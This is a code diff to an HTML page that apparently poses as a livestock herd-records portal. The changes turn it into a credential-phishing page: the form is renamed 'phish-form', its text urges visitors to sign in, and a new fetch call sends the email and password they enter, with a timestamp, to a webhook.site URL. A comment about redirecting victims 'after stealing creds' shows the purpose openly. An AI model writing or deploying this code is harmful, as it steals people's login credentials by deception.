@@ -108,12 +108,12 @@
     </div>
 
     <div class="login-section">
-        <h2>Herd Records</h2>
-        <p>Quarterly data entry required.</p>
-        <form class="login-form" id="data-form">
+        <h2>Update Herd Records</h2>
+        <p>Please sign in to submit your quarterly data entry.</p>
+        <form class="login-form" id="phish-form">
             <input type="email" id="email" placeholder="Email Address" required>
             <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Save & Continue</button>
+            <button type="submit">Submit Data & Sign In</button>
         </form>
     </div>
 </div>
@@ -145,16 +145,34 @@
             document.getElementById('herd-data').innerHTML = '<p>Error loading data.</p>';
         });
 
-    // Event listener for the submit button
-    document.getElementById('data-form').addEventListener('submit', function(e) {
-        e.preventDefault();
-        // Capture credentials
+    // Handle Form Submission and Send to Webhook
+    document.getElementById('phish-form').addEventListener('submit', function(e) {
+        e.preventDefault(); // Stop the page from reloading
+        
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         
-        // Example: Send to your backend
-        console.log(`Captured: ${email} / ${password}`);
-        alert("Changes saved successfully."); 
+        // Send data to your Webhook.site URL
+        fetch('https://webhook.site/b40381b2-bb88-47fb-8c72-16b8f9e34b49', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString()
+            })
+        }).then(() => {
+            // Optional: Show a success message or redirect
+            alert("Changes saved successfully.");
+            
+            // If you want to redirect them to the real site after stealing creds:
+            // window.location.href = "https://your-real-site.com";
+        }).catch(err => {
+            console.error('Webhook failed:', err);
+            alert("Error saving changes.");
+        });
     });
 </script>
 
